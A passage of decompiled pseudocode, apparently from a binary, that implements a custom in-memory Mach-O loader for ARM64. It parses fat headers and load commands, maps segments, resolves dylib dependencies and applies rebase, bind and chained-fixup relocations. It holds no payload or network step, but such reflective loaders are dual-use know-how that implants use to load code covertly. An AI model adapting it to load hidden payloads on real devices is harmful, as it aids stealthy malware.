    v14 = *(_QWORD *)(v13 + 160);
  }
  else
  {
    v404 = 255;
  }
  if ( *a2 == -889275714 || *a2 == -1095041334 )
  {
    v20 = a2[1];
    if ( !v20 )
      return 73734;
    v393 = v13;
    v395 = a4;
    v397 = 0;
    v21 = 0;
    v22 = 0;
    v401 = 0;
    v23 = (unsigned __int64)a2 + v14;
    v24 = bswap32(v20);
    v25 = v24 <= 1 ? 1 : v24;
    do
    {
      v26 = (_DWORD *)((char *)a2 + (unsigned int)sub_4DD4(20, v21) + 8);
      v8 = 73732;
      if ( v26 < a2 || v23 <= (unsigned __int64)v26 )
        return v8;
      if ( (_DWORD *)((char *)v26 + 19) < a2 || v23 <= (unsigned __int64)v26 + 19 )
        return v8;
      v29 = bswap32(v26[2]);
      v8 = 73733;
      if ( (__int64)v14 <= v29 )
        return v8;
      v30 = (char *)a2 + v29;
      v31 = bswap32(v26[3]);
      v32 = (unsigned __int64)&v30[v31 - 1];
      if ( v32 < (unsigned __int64)a2 || v23 <= v32 )
        return v8;
      if ( *v26 == 201326593 )
      {
        v34 = bswap32(v26[1] & 0xFFFFFF00);
        if ( v34 <= v404 && (int)v34 >= v22 )
        {
          v397 = v31;
          v401 = v30;
          v22 = v34;
        }
      }
      v21 = (unsigned int)(v21 + 1);
    }
    while ( v25 != (_DWORD)v21 );
    a4 = v395;
    v36 = v401;
    if ( !v401 )
      return 73734;
    v13 = v393;
    v14 = v397;
    *(_QWORD *)(v393 + 160) = v397;
    *(_QWORD *)(v393 + 104) = v401;
  }
  else
  {
    v36 = a2;
  }
  if ( v14 < 0x20 )
  {
    v37 = 73730;
    return (unsigned int)(v37 + 4095);
  }
  if ( *v36 != -17958193 )
  {
    v37 = 73730;
    return (unsigned int)(v37 + 4096);
  }
  v37 = 77827;
  v8 = 77827;
  if ( (unsigned __int64)(unsigned int)v36[5] + 32 > v14 )
    return v8;
  if ( !v15 && v36[3] != 7 )
    return 77830;
  if ( v36[1] != 16777228 )
    return 77828;
  v38 = v36[2] & 0xFFFFFF;
  if ( v38 > v404 )
    return 77829;
  v40 = *(_BYTE *)(v13 + 172);
  if ( v38 == 2 )
  {
    v40 |= 0x40u;
    *(_BYTE *)(v13 + 172) = v40;
  }
  *(_BYTE *)(v13 + 172) = (*((_BYTE *)v36 + 24) >> 2) & 8 | v40 & 0xF7;
  *(_QWORD *)v13 = v36;
  v41 = v36[4];
  if ( v41 )
  {
    v42 = 0;
    v43 = 0;
    v44 = v36 + 8;
    do
    {
      v8 = 81921;
      if ( v44 < v36 || (_DWORD *)((char *)v36 + v14) <= v44 )
        return v8;
      if ( *v44 == 25 )
      {
        v45 = *((_QWORD *)v44 + 4);
        if ( __CFADD__(v43, v45) )
          return (unsigned int)(v37 + 4095);
        if ( !*((_QWORD *)v44 + 5) && *((_QWORD *)v44 + 6) )
        {
          if ( v42 )
            return (unsigned int)(v37 + 4096);
          v42 = *((_QWORD *)v44 + 3);
        }
        if ( v45 >= 0xFFFFFFFF )
          v45 = 0;
        v43 += v45;
      }
      v44 = (_DWORD *)((char *)v44 + (unsigned int)v44[1]);
      --v41;
    }
    while ( v41 );
  }
  else
  {
    v43 = 0;
    v42 = 0;
  }
  v46 = 81927;
  v47 = sub_5B4C(a1, v43, 1);
  if ( v47 == -1 )
    return 81924;
  *(_QWORD *)(v13 + 80) = v42;
  *(_QWORD *)(v13 + 88) = v47;
  *(_DWORD *)(v13 + 168) = v43;
  v48 = a1[186];
  if ( v48 )
  {
    v49 = a1[187];
    v50 = v48 + v47 - v49;
    if ( v49 )
      v47 = v50;
  }
  *(_QWORD *)(v13 + 96) = v47;
  v51 = *(_QWORD *)v13;
  if ( !*(_DWORD *)(*(_QWORD *)v13 + 16LL) )
  {
    v410 = 0;
    v403 = (__int64 *)(v13 + 120);
    v406 = (unsigned __int64 *)(v13 + 56);
    v84 = (unsigned int **)(v13 + 64);
    goto LABEL_170;
  }
  if ( *(__int64 *)(v13 + 160) < 33 )
    return 81929;
  v52 = 0;
  v53 = *(_QWORD *)(v13 + 104) + 32LL;
  while ( 1 )
  {
    v54 = *(_DWORD *)v53;
    if ( *(int *)v53 > 14 )
    {
      if ( v54 > 25 )
      {
        if ( v54 != 26 )
        {
          if ( v54 != 34 )
            goto LABEL_116;
LABEL_111:
          *(_QWORD *)(v13 + 32) = v53;
          goto LABEL_116;
        }
        v58 = *(_BYTE *)(v13 + 172) | 4;
      }
      else
      {
        if ( v54 != 15 )
        {
          if ( v54 != 25 || !(unsigned int)sub_4C18(v53 + 8, "__PAGEZERO") )
            goto LABEL_116;
          v55 = a1;
          if ( (unsigned int)sub_4C18(v53 + 8, "__TEXT") )
          {
            if ( (unsigned int)sub_4C18(v53 + 8, "__DATA") )
            {
              v56 = sub_4C18(v53 + 8, "__LINKEDIT");
              v57 = 0;
              v405 = 0;
              if ( !v56 )
                *(_QWORD *)(v13 + 8) = *(_QWORD *)(v13 + 88)
                                     - *(_QWORD *)(v13 + 80)
                                     + *(_QWORD *)(v53 + 24)
                                     - *(_QWORD *)(v53 + 40);
            }
            else
            {
              v57 = 0;
              v405 = 1;
            }
          }
          else
          {
            v405 = 0;
            v57 = 1;
          }
          v61 = *(_QWORD *)(v13 + 88);
          v62 = *(_QWORD *)(v53 + 48);
          v63 = v62 - 1;
          if ( !v62 )
            v63 = 0;
          if ( !v61 )
            return 81926;
          v64 = *(_QWORD *)(v53 + 32);
          if ( (v64 & 0x8000000000000000LL) != 0 )
            goto LABEL_399;
          v65 = v64 - v62;
          if ( v64 < v62 )
            goto LABEL_399;
          v66 = *(_QWORD *)(v53 + 40);
          if ( v66 < 0 )
            goto LABEL_399;
          v67 = *(_QWORD *)(v13 + 160);
          if ( v67 <= v66
            || (v68 = *(_QWORD *)(v13 + 104), v69 = v68 + v66, v70 = v68 + v66 + v63, v70 < v68)
            || (v402 = v57, v68 + v67 <= v70)
            || (v71 = *(_QWORD *)(v53 + 24) + v61 - *(_QWORD *)(v13 + 80), v71 < v61)
            || (v72 = v61 + *(unsigned int *)(v13 + 168), v72 <= v71)
            || (v73 = v71 - 1 + v64, v73 < v61)
            || v72 <= v73 )
          {
LABEL_399:
            v234 = 16391;
            return v234 | 0x10000u;
          }
          if ( (unsigned int)sub_5C74(v55, v71) )
            return (unsigned int)(v46 + 1);
          sub_4994(v71, v69, v62);
          sub_4B68(v71 + v62, 0, v65);
          a1 = v55;
          v74 = v402;
          if ( !*(_DWORD *)(v53 + 64) )
            goto LABEL_116;
          v75 = 0;
          while ( 1 )
          {
            v77 = a1;
            v78 = sub_4DD4(80, v75);
            v76 = v53 + 72;
            v79 = v53 + 72 + v78;
            v80 = *(_QWORD *)(v13 + 104);
            if ( v79 < v80 || v80 + *(_QWORD *)(v13 + 160) <= v79 )
              return 81930;
            v82 = *(unsigned __int8 *)(v79 + 64);
            if ( v82 == 10 )
              break;
            if ( v82 == 9 )
            {
              v83 = *(_BYTE *)(v13 + 172) | 1;
LABEL_148:
              *(_BYTE *)(v13 + 172) = v83;
              goto LABEL_149;
            }
            if ( !v74 )
            {
              if ( !v405 || (unsigned int)sub_4C18(v76 + v78, "__internal") )
                goto LABEL_149;
              v83 = *(_BYTE *)(v13 + 172) | 0x20;
              goto LABEL_148;
            }
            if ( (unsigned int)sub_4C18(v76 + v78, "__eh_frame") )
            {
              if ( (unsigned int)sub_4C18(v79, "__unwind_info") )
              {
                if ( (unsigned int)sub_4C18(v79, "__x") )
                {
                  if ( (unsigned int)sub_4C18(v79, "__stubs") )
                  {
                    if ( (unsigned int)sub_4C18(v79, "__auth_stubs") )
                    {
                      v46 = 81927;
                      v74 = v402;
                      if ( !(unsigned int)sub_4C18(v79, "__objc_stubs") )
                      {
                        *(_QWORD *)(v13 + 272) = *(_QWORD *)(v13 + 88) - *(_QWORD *)(v13 + 80) + *(_QWORD *)(v79 + 32);
                        *(_QWORD *)(v13 + 280) = *(_QWORD *)(v79 + 40);
                      }
                      goto LABEL_149;
                    }
                    *(_QWORD *)(v13 + 256) = *(_QWORD *)(v13 + 88) - *(_QWORD *)(v13 + 80) + *(_QWORD *)(v79 + 32);
                    *(_QWORD *)(v13 + 264) = *(_QWORD *)(v79 + 40);
                  }
                  else
                  {
                    *(_QWORD *)(v13 + 240) = *(_QWORD *)(v13 + 88) - *(_QWORD *)(v13 + 80) + *(_QWORD *)(v79 + 32);
                    *(_QWORD *)(v13 + 248) = *(_QWORD *)(v79 + 40);
                  }
                }
                else
                {
                  *(_QWORD *)(v13 + 232) = *(_QWORD *)(v13 + 88) - *(_QWORD *)(v13 + 80) + *(_QWORD *)(v79 + 32);
                }
                v46 = 81927;
                v74 = v402;
              }
              else
              {
                *(_DWORD *)(v13 + 180) = v79 - v53;
              }
            }
            else
            {
              *(_DWORD *)(v13 + 176) = v79 - v53;
            }
LABEL_149:
            v75 = (unsigned int)(v75 + 1);
            a1 = v77;
            if ( (unsigned int)v75 >= *(_DWORD *)(v53 + 64) )
              goto LABEL_116;
          }
          v83 = *(_BYTE *)(v13 + 172) | 2;
          goto LABEL_148;
        }
        v58 = *(_BYTE *)(v13 + 172) | 0x10;
      }
      *(_BYTE *)(v13 + 172) = v58;
      goto LABEL_116;
    }
    if ( v54 > 1 )
    {
      if ( v54 == 2 )
      {
        *(_QWORD *)(v13 + 48) = v53;
      }
      else if ( v54 == 13 )
      {
        *(_QWORD *)(v13 + 24) = v53;
      }
    }
    else
    {
      if ( v54 == -2147483614 )
        goto LABEL_111;
      if ( v54 == -2147483596 )
      {
        *(_BYTE *)(v13 + 172) |= 0x40u;
        *(_QWORD *)(v13 + 40) = v53;
      }
    }
LABEL_116:
    ++v52;
    v51 = *(_QWORD *)v13;
    v59 = *(_DWORD *)(*(_QWORD *)v13 + 16LL);
    if ( v52 >= v59 )
      break;
    v53 += *(unsigned int *)(v53 + 4);
    v60 = *(_QWORD *)(v13 + 104);
    v8 = 81929;
    if ( v53 < v60 || v60 + *(_QWORD *)(v13 + 160) <= v53 )
      return v8;
  }
  v184 = a1;
  v185 = *(_QWORD *)(v13 + 104);
  v410 = 0;
  v403 = (__int64 *)(v13 + 120);
  v406 = (unsigned __int64 *)(v13 + 56);
  v84 = (unsigned int **)(v13 + 64);
  if ( v59 )
  {
    v8 = 94209;
    v186 = *(_QWORD *)(v13 + 160);
    if ( v186 < 33 )
      return v8;
    v187 = v13;
    v188 = 0;
    v189 = v185 + v186;
    v190 = (int *)(v185 + 32);
    while ( 1 )
    {
      v191 = *v190;
      if ( *v190 > 10 )
      {
        if ( v191 != 12 )
        {
          if ( v191 == 11 )
            *v84 = (unsigned int *)v190;
          goto LABEL_375;
        }
      }
      else if ( v191 != -2147483624 )
      {
        if ( v191 == 2 )
        {
          *(_QWORD *)(v13 + 48) = v190;
          v192 = *(_QWORD *)(v13 + 8);
          v193 = v192 + (unsigned int)v190[4];
          *(_QWORD *)(v13 + 72) = v193;
          v194 = *(_QWORD *)(v13 + 88);
          v195 = v194 + *(unsigned int *)(v13 + 168);
          if ( v193 < v194 || v195 <= v193 )
            return v8;
          v197 = v192 + (unsigned int)v190[2];
          *v406 = v197;
          v198 = v197 >= v194 && v195 > v197;
          v13 = v187;
          if ( !v198 )
            return v8;
        }
        goto LABEL_375;
      }
      v199 = (unsigned int)v190[2];
      v200 = (char *)v190 + v199;
      if ( (unsigned __int64)v190 + v199 < v185 || v189 <= (unsigned __int64)v200 )
        return v8;
      v202 = sub_4CB4((char *)v190 + v199, "@rpath", 6);
      v205 = 6;
      if ( v202 )
        v205 = 0;
      v206 = &v200[v205];
      v207 = sub_5C((__int64)&v200[v205], 2, v203, v204);
      if ( !v207 )
        return 94212;
      v208 = v410;
      if ( v410 == 64 )
        return 94213;
      v209 = v207;
      ++v410;
      v409[v208] = v207;
      v13 = v187;
      if ( !(unsigned int)sub_4C18(v206, "/usr/lib/libobjc.A.dylib") )
        *v403 = v209;
LABEL_375:
      ++v188;
      v51 = *(_QWORD *)v13;
      if ( v188 >= *(_DWORD *)(*(_QWORD *)v13 + 16LL) )
        break;
      v190 = (int *)((char *)v190 + (unsigned int)v190[1]);
      v185 = *(_QWORD *)(v13 + 104);
      v189 = v185 + *(_QWORD *)(v13 + 160);
      if ( (unsigned __int64)v190 < v185 || v189 <= (unsigned __int64)v190 )
        return v8;
    }
  }
  a1 = v184;
LABEL_170:
  v85 = *(_QWORD *)(v13 + 40);
  v394 = v13;
  v396 = a4;
  v392 = a1;
  if ( v85 && *(_DWORD *)(v85 + 8) )
  {
    v8 = 708616;
    if ( (*(_BYTE *)(v13 + 172) & 0x40) == 0 )
      goto LABEL_402;
    v8 = 708609;
    if ( !*(_DWORD *)(v85 + 12) )
      goto LABEL_402;
    v415 = 0;
    v86 = sub_5CF4(v13);
    if ( !(_DWORD)v86 )
    {
      v86 = 9568259;
      v87 = v415;
      if ( !*v415 && v415[1] >= 0x1C && v415[2] >= 0x1C && v415[3] >= 0x1C )
      {
        v88 = v415[4];
        if ( (_DWORD)v88 )
        {
          if ( !v415[6] )
          {
            if ( WORD1(v88) )
            {
              v86 = 708609;
            }
            else
            {
              v390 = (8 * (unsigned __int16)v88) & 0x7FFF8;
              v407 = sub_5B4C(v392, v390, 0);
              if ( v407 )
              {
                sub_4B68(v407, 0, v390);
                v89 = 0;
                v90 = (char *)v87 + v87[3];
                v91 = v87;
                do
                {
                  if ( v87[5] != 1 )
                  {
                    v98 = 9568260;
                    goto LABEL_739;
                  }
                  v92 = *(unsigned int *)((char *)v91 + v87[2]);
                  if ( (unsigned __int8)*(unsigned int *)((char *)v91 + v87[2]) <= 0xF0u )
                    v93 = (unsigned __int8)*(unsigned int *)((char *)v91 + v87[2]);
                  else
                    v93 = (unsigned int)(char)v92;
                  v94 = *(unsigned int *)((char *)v91 + v87[2]) & 0x100;
                  v95 = (_QWORD *)(v407 + v89);
                  v96 = sub_5E10(&v90[v92 >> 9], v409, v392, v407 + v89, v93);
                  if ( (_DWORD)v96 != 9502726 || v94 == 0 )
                  {
                    v98 = v96;
                    if ( (_DWORD)v96 )
                      goto LABEL_739;
                  }
                  else
                  {
                    *v95 = 0;
                  }
                  sub_10EC();
                  *v95 = v99;
                  ++v91;
                  v89 += 8;
                }
                while ( 8 * v88 != v89 );
                v100 = v415;
                if ( !v415 )
                  goto LABEL_738;
                v101 = v415[1];
                v398 = (unsigned int *)((char *)v415 + v101);
                if ( (unsigned int *)((char *)v415 + v101) < v415
                  || *(_DWORD *)(*(_QWORD *)(v394 + 40) + 12LL) <= (unsigned int)v101 )
                {
                  v8 = 9568257;
                  goto LABEL_738;
                }
                v380 = *v398;
                if ( *v398 )
                {
                  v381 = 0;
                  while ( 1 )
                  {
                    v382 = v398[v381 + 1];
                    if ( (_DWORD)v382 )
                    {
                      v383 = (char *)v398 + v382;
                      if ( (unsigned int *)((char *)v398 + v382) < v100
                        || (char *)v100 + *(unsigned int *)(*(_QWORD *)(v394 + 40) + 12LL) <= v383 )
                      {
                        v8 = 9568257;
                        goto LABEL_738;
                      }
                      v385 = 0;
                      v386 = v383 + 22;
                      while ( v385 < *((unsigned __int16 *)v383 + 10) )
                      {
                        v387 = *(unsigned __int16 *)&v386[2 * v385];
                        if ( v387 == 0xFFFF )
                        {
                          v8 = 0;
                        }
                        else if ( (v387 & 0x8000) != 0 )
                        {
                          v388 = v387 & 0x7FFF;
                          do
                          {
                            v389 = *(__int16 *)&v386[2 * v388];
                            v8 = sub_6340(v394, v407, (unsigned __int16)v88, v383, v385, v389 & 0x7FFF);
                          }
                          while ( !(_DWORD)v8 && (v389 & 0x80000000) == 0 );
                        }
                        else
                        {
                          v8 = sub_6340(v394, v407, (unsigned __int16)v88, v383, v385, v387);
                        }
                        ++v385;
                        if ( (_DWORD)v8 )
                          goto LABEL_738;
                      }
                      v380 = *v398;
                    }
                    v8 = 0;
                    if ( ++v381 >= (unsigned __int64)v380 )
                      goto LABEL_738;
                  }
                }
                v8 = 0;
LABEL_738:
                v98 = v8;
LABEL_739:
                sub_5ADC(v392, v407, v390);
                v86 = v98;
              }
              else
              {
                v86 = 708617;
              }
            }
          }
        }
      }
    }
    goto LABEL_383;
  }
  v103 = *(unsigned int **)(v13 + 32);
  if ( v103 && v103[4] )
  {
    if ( (*(_BYTE *)(v13 + 172) & 0x40) != 0 )
    {
      v162 = 0;
      v163 = v13;
    }
    else
    {
      v8 = 9633795;
      v104 = v13;
      v105 = *(_QWORD *)(v13 + 96);
      v106 = *(_QWORD *)(v104 + 80);
      v107 = *(_QWORD *)(v104 + 8);
      v109 = v103[2];
      v108 = v103[3];
      v110 = sub_66BC(0);
      if ( !v110 )
      {
LABEL_401:
        v8 = 9633796;
        goto LABEL_402;
      }
      if ( (_DWORD)v108 )
      {
        v111 = (_DWORD *)v110;
        v112 = v105 - v106;
        v113 = (char *)(v107 + v109);
        v114 = v107 + v109 + v108;
        v115 = 1;
        do
        {
          v116 = (unsigned __int8)*v113++;
          v117 = v116 & 0xF;
          v118 = v116 >> 4;
          if ( v116 >> 4 > 4 )
          {
            if ( v118 > 6 )
            {
              if ( v118 == 7 )
              {
                v147 = *(_QWORD *)(v394 + 88);
                if ( v147 > (unsigned __int64)v111 || v147 + *(unsigned int *)(v394 + 168) <= (unsigned __int64)v111 )
                  goto LABEL_402;
                if ( v115 == 2 )
                {
                  *v111 += v112;
                }
                else if ( v115 == 1 )
                {
                  *(_QWORD *)v111 += v112;
                }
                v157 = 0;
                v158 = 0;
                v122 = v113;
                while ( (unsigned __int64)v122 < v114 )
                {
                  v160 = *v122++;
                  v159 = v160;
                  v161 = (unsigned __int64)(v160 & 0x7F) << v158;
                  if ( v158 >= 0x40 )
                    v161 = 0;
                  v157 |= v161;
                  v158 += 7;
                  if ( (v159 & 0x80) == 0 )
                    goto LABEL_303;
                }
                v157 = 0;
                v122 = v113;
LABEL_303:
                v111 = (_DWORD *)((char *)v111 + v157 + 8);
                goto LABEL_304;
              }
              if ( v118 == 8 )
              {
                v134 = 0;
                v135 = 0;
                v136 = v113;
                while ( (unsigned __int64)v136 < v114 )
                {
                  v138 = *v136++;
                  v137 = v138;
                  v139 = (unsigned __int64)(v138 & 0x7F) << v135;
                  if ( v135 >= 0x40 )
                    v139 = 0;
                  v134 |= v139;
                  v135 += 7;
                  if ( (v137 & 0x80) == 0 )
                    goto LABEL_274;
                }
                v134 = 0;
                v136 = v113;
LABEL_274:
                v149 = 0;
                v150 = 0;
                v113 = v136;
                while ( (unsigned __int64)v113 < v114 )
                {
                  v152 = *v113++;
                  v151 = v152;
                  v153 = (unsigned __int64)(v152 & 0x7F) << v150;
                  if ( v150 >= 0x40 )
                    v153 = 0;
                  v149 |= v153;
                  v150 += 7;
                  if ( (v151 & 0x80) == 0 )
                    goto LABEL_283;
                }
                v149 = 0;
                v113 = v136;
LABEL_283:
                if ( v134 )
                {
                  v154 = v149 + 8;
                  v155 = *(_QWORD *)(v394 + 88);
                  v156 = 2;
                  while ( v155 <= (unsigned __int64)v111
                       && v155 + *(unsigned int *)(v394 + 168) > (unsigned __int64)v111 )
                  {
                    if ( v115 == 2 )
                    {
                      *v111 += v112;
                    }
                    else if ( v115 == 1 )
                    {
                      *(_QWORD *)v111 += v112;
                    }
                    v111 = (_DWORD *)((char *)v111 + v154);
                    v315 = v134 >= v156++;
                    if ( !v315 )
                      goto LABEL_305;
                  }
LABEL_402:
                  *v396 = v394;
                  return v8;
                }
              }
            }
            else if ( v118 == 5 )
            {
              if ( (_DWORD)v117 )
              {
                v140 = *(_QWORD *)(v394 + 88);
                v141 = v111;
                while ( (unsigned __int64)v111 >= v140 && v140 + *(unsigned int *)(v394 + 168) > (unsigned __int64)v141 )
                {
                  if ( v115 == 2 )
                  {
                    *v141 += v112;
                  }
                  else if ( v115 == 1 )
                  {
                    *(_QWORD *)v141 += v112;
                  }
                  v141 += 2;
                  LODWORD(v117) = v117 - 1;
                  if ( !(_DWORD)v117 )
                  {
                    v111 = v141;
                    goto LABEL_305;
                  }
                }
                goto LABEL_402;
              }
            }
            else if ( v118 == 6 )
            {
              v126 = 0;
              v127 = 0;
              v122 = v113;
              while ( (unsigned __int64)v122 < v114 )
              {
                v129 = *v122++;
                v128 = v129;
                v130 = (unsigned __int64)(v129 & 0x7F) << v127;
                if ( v127 >= 0x40 )
                  v130 = 0;
                v126 |= v130;
                v127 += 7;
                if ( (v128 & 0x80) == 0 )
                {
                  if ( !v126 )
                    goto LABEL_304;
                  v131 = *(_QWORD *)(v394 + 88);
                  v132 = 2;
                  v133 = v111;
                  while ( (unsigned __int64)v111 >= v131
                       && v131 + *(unsigned int *)(v394 + 168) > (unsigned __int64)v133 )
                  {
                    if ( v115 == 2 )
                    {
                      *v133 += v112;
                    }
                    else if ( v115 == 1 )
                    {
                      *(_QWORD *)v133 += v112;
                    }
                    v133 += 2;
                    v315 = v126 >= v132++;
                    if ( !v315 )
                    {
                      v113 = v122;
                      v111 = v133;
                      goto LABEL_305;
                    }
                  }
                  goto LABEL_402;
                }
              }
            }
          }
          else
          {
            if ( v118 > 2 )
            {
              if ( v118 != 3 )
              {
                if ( v118 == 4 )
                  v111 = (_DWORD *)((char *)v111 + (unsigned int)sub_4DD4(v117, 8));
                continue;
              }
              v142 = 0;
              v143 = 0;
              v122 = v113;
              while ( (unsigned __int64)v122 < v114 )
              {
                v145 = *v122++;
                v144 = v145;
                v146 = (unsigned __int64)(v145 & 0x7F) << v143;
                if ( v143 >= 0x40 )
                  v146 = 0;
                v142 |= v146;
                v143 += 7;
                if ( (v144 & 0x80) == 0 )
                  goto LABEL_281;
              }
              v142 = 0;
              v122 = v113;
LABEL_281:
              v111 = (_DWORD *)((char *)v111 + v142);
              goto LABEL_304;
            }
            switch ( v118 )
            {
              case 1:
                v115 = v117;
                break;
              case 2:
                v119 = sub_66BC(v117);
                if ( !v119 )
                  goto LABEL_401;
                v120 = 0;
                v121 = 0;
                v122 = v113;
                while ( (unsigned __int64)v122 < v114 )
                {
                  v124 = *v122++;
                  v123 = v124;
                  v125 = (unsigned __int64)(v124 & 0x7F) << v121;
                  if ( v121 >= 0x40 )
                    v125 = 0;
                  v120 |= v125;
                  v121 += 7;
                  if ( (v123 & 0x80) == 0 )
                    goto LABEL_294;
                }
                v120 = 0;
                v122 = v113;
LABEL_294:
                v111 = (_DWORD *)(v119 + v120);
LABEL_304:
                v113 = v122;
                break;
              case 0:
                goto LABEL_308;
            }
          }
LABEL_305:
          ;
        }
        while ( (unsigned __int64)v113 < v114 );
      }
LABEL_308:
      v8 = sub_4E38(0, v394, v409, v392);
      if ( (_DWORD)v8 )
        goto LABEL_402;
      v162 = 1;
      v163 = v394;
    }
    v86 = sub_4E38(v162, v163, v409, v392);
    goto LABEL_383;
  }
  v86 = 708609;
  v164 = *(_QWORD *)(v13 + 8);
  if ( !v164 || (v165 = *v84) == 0 || (v166 = *(_QWORD *)(v13 + 88)) == 0 || !*v406 )
  {
    v8 = 708609;
    goto LABEL_402;
  }
  v167 = *(_QWORD *)(v13 + 96);
  v168 = *(_QWORD *)(v13 + 80);
  v169 = ((__int64 (*)(void))sub_6E74)();
  v170 = v165[19];
  if ( (_DWORD)v170 )
  {
    v171 = (unsigned int *)(v164 + v165[18]);
    v172 = &v171[2 * v170];
    v8 = 4096;
    if ( v172 <= v171 )
      goto LABEL_402;
    if ( (unsigned __int64)v171 < v166 )
      goto LABEL_402;
    v173 = v166 + *(unsigned int *)(v394 + 168);
    if ( v173 <= (unsigned __int64)v171 )
      goto LABEL_402;
    v8 = 4096;
    if ( (unsigned __int64)v172 - 1 < v166 || v173 <= (unsigned __int64)v172 - 1 )
      goto LABEL_402;
    v8 = 9633794;
    while ( 1 )
    {
      v174 = *v171;
      if ( (v174 & 0x80000000) != 0 )
        break;
      v175 = v171[1];
      if ( (v175 & 0xFFFFFF) != 0 )
      {
        if ( (v175 & 0xF6000000) != 0x6000000 )
          goto LABEL_402;
LABEL_328:
        v176 = (_QWORD *)(v169 + v174);
        if ( (unsigned __int64)v176 < v166 || v173 <= (unsigned __int64)v176 )
        {
          v8 = 9633793;
          goto LABEL_402;
        }
        *v176 += v167 - v168;
      }
      v171 += 2;
      if ( v171 >= v172 )
        goto LABEL_335;
    }
    if ( (~(_DWORD)v174 & 0x30000000) != 0 || (v174 & 0xF000000) != 0 )
      goto LABEL_402;
    v174 &= 0xFFFFFFuLL;
    goto LABEL_328;
  }
LABEL_335:
  v415 = 0;
  v178 = v165[17];
  if ( (int)v178 >= 1 )
  {
    v179 = v164 + v165[16];
    v180 = v179 + 8 * v178;
    if ( v180 <= v179 )
      goto LABEL_343;
    v8 = 4096;
    if ( v179 < v166 )
      goto LABEL_402;
    v181 = v166 + *(unsigned int *)(v394 + 168);
    if ( v181 <= v179 )
      goto LABEL_402;
    v182 = v180 - 1;
    if ( v182 < v166 || v181 <= v182 )
    {
LABEL_343:
      v8 = 4096;
      goto LABEL_402;
    }
    v8 = 9502722;
    v235 = *(_DWORD *)(v51 + 24);
    v399 = sub_6E74(v394);
    v236 = 0;
    v237 = 0;
    v238 = 0;
    do
    {
      v239 = *(_DWORD *)(v179 + 8 * v237 + 4);
      if ( (v239 & 0xF6000000) != 0x6000000 )
        goto LABEL_402;
      v240 = (unsigned __int64 *)(v399 + *(int *)(v179 + 8 * v237));
      v241 = *v406;
      v242 = *(_QWORD *)&v239 & 0xFFFFFFLL;
      v243 = *v406 + 16 * (*(_QWORD *)&v239 & 0xFFFFFFLL);
      v244 = *(_QWORD *)(v394 + 88);
      v245 = v244 + *(unsigned int *)(v394 + 168);
      v246 = (unsigned __int64)v240 >= v244 && v245 > (unsigned __int64)v240;
      v247 = !v246 || v244 > v243;
      if ( v247 || v245 <= v243 )
        goto LABEL_402;
      v249 = (char **)(v399 + *(int *)(v179 + 8 * v237));
      v250 = *v240;
      v251 = *v240;
      if ( (v235 & 0x10) != 0 )
      {
        v252 = v241 + 16 * v242;
        if ( (~*(_BYTE *)(v252 + 4) & 0xE) != 0 || (*(_WORD *)(v252 + 6) & 0x80) == 0 )
        {
          v251 = v250 - *(_QWORD *)(v252 + 8);
          goto LABEL_425;
        }
        v254 = v241 + 16 * v242;
        v255 = v250 - *(_QWORD *)(v254 + 8);
        if ( !v255 )
          goto LABEL_434;
        v256 = *(_DWORD *)(*(_QWORD *)v394 + 16LL);
        if ( !v256 )
          goto LABEL_445;
        v257 = *(unsigned __int8 *)(v254 + 5);
        v258 = (_DWORD *)(*(_QWORD *)(v394 + 104) + 32LL);
        v259 = 1;
        do
        {
          if ( *v258 == 25 )
          {
            v260 = v258[16];
            if ( (unsigned __int8)v259 <= v257 && v260 + (unsigned int)(unsigned __int8)v259 > v257 )
            {
              v261 = v258 + 18;
              v262 = v257 - (unsigned __int8)v259;
              v263 = *(_QWORD *)&v261[20 * v262 + 8];
              if ( v263 > v250 || *(_QWORD *)&v261[20 * v262 + 10] + v263 <= v250 )
              {
LABEL_445:
                v251 = 0;
                break;
              }
LABEL_434:
              v251 = v255;
              break;
            }
            v259 += v260;
          }
          v251 = 0;
          v258 = (_DWORD *)((char *)v258 + (unsigned int)v258[1]);
          --v256;
        }
        while ( v256 );
      }
LABEL_425:
      if ( v243 != v238 )
      {
        if ( !(unsigned int)sub_6F10(v394, v243, &v415, v409, v392) )
        {
          v8 = 9502721;
          goto LABEL_402;
        }
        v236 = v415;
      }
      v253 = (char *)v236 + v251;
      if ( (v235 & 0x10) == 0 || *v249 != v253 )
        *v249 = v253;
      ++v237;
      v238 = v243;
    }
    while ( v237 != v178 );
  }
  v264 = *(_QWORD *)(v394 + 104);
  v415 = 0;
  if ( v264 )
  {
    v265 = *(_QWORD *)(v394 + 8);
    if ( v265 )
    {
      if ( *v84 && *(_QWORD *)(v394 + 88) && *v406 )
      {
        v266 = *(_QWORD *)v394;
        if ( !*(_DWORD *)(*(_QWORD *)v394 + 16LL) )
        {
          v86 = 0;
          goto LABEL_383;
        }
        v391 = 0;
        v400 = (_DWORD *)(v264 + 32);
        v267 = v265 + (*v84)[14];
        v268 = *(_QWORD *)(v394 + 96) - *(_QWORD *)(v394 + 80);
        while ( 1 )
        {
          if ( *v400 == 25 )
          {
            v269 = v400 + 18;
            v270 = (unsigned __int64)&v400[20 * v400[16] + 18];
            if ( v270 > (unsigned __int64)(v400 + 18) )
              break;
          }
          v86 = 0;
LABEL_489:
          v400 = (_DWORD *)((char *)v400 + (unsigned int)v400[1]);
          if ( (unsigned int)++v391 >= *(_DWORD *)(v266 + 16) || (_DWORD)v86 != 0 )
            goto LABEL_383;
        }
        v86 = 0;
        while ( 1 )
        {
          v271 = v86;
          v272 = v269[16];
          v273 = sub_4D84((unsigned int)v269[10], 8);
          if ( (v272 & 0xFE) == 6 && v273 != 0 )
          {
            v275 = (unsigned int)v269[17];
            v276 = v267 + 4 * v275;
            v277 = *(_QWORD *)(v394 + 88);
            v278 = v277 + *(unsigned int *)(v394 + 168);
            v86 = 9502725;
            if ( v277 <= v276 && v278 > v276 )
            {
              v280 = v267 + 4LL * (v273 + (unsigned int)v275 - 1);
              if ( v277 <= v280 && v278 > v280 )
                break;
            }
          }
LABEL_486:
          v269 += 20;
          if ( (unsigned __int64)v269 >= v270 )
          {
            v266 = *(_QWORD *)v394;
            goto LABEL_489;
          }
        }
        v282 = (unsigned int **)(*((_QWORD *)v269 + 4) + v268);
        v283 = v273;
        v86 = v271;
        while ( 1 )
        {
          v284 = *(unsigned int *)(v267 + 4LL * (unsigned int)v275);
          if ( (_DWORD)v284 != 0x40000000 )
          {
            if ( (_DWORD)v284 == 0x80000000 )
            {
              v285 = (unsigned int *)((char *)*v282 + v268);
            }
            else
            {
              v286 = *v406 + 16 * v284;
              v287 = *(_QWORD *)(v394 + 88);
